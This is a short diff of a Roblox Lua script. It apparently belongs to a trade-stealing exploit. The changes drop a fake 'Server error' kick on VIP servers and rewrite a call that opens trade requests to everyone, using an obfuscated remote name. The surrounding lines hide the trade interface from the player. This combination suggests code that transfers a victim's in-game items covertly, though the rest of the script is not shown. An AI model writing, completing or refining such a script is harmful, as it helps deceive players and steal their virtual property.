@@ -33,17 +33,12 @@ if #Players:GetPlayers() >= 16 then
     return
 end
 
-if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
-    plr:kick("Server error. Please join a DIFFERENT server")
-    return
-end
-
 -- Allow trade requests from everyone
 local tradeArgs = {
-    [1] = "AllowRequests",
-    [2] = "Everyone"
+	"AllowRequests",
+	"Everyone"
 }
-netModule:WaitForChild("RF/.G65?u>/&3x,6vB>C;"):InvokeServer(unpack(tradeArgs))
+game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net"):WaitForChild("RF/ZJ:hlp9/*3x'jvB>ql"):InvokeServer(unpack(tradeArgs))
 
 -- Hide UI elements
 tradeGui.Black.Visible = false
